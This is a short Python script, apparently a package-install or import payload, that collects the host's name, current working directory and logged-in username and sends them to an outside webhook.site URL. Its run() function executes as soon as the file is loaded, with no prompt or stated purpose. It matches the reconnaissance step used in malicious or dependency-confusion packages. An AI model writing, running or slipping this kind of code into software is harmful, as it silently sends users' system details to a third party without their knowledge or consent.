import os,requests,getpass,socket
def run():
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://webhook.site/dad7b1a6-0a0c-4aa3-b047-5e5929839144",params = ploads)

run()
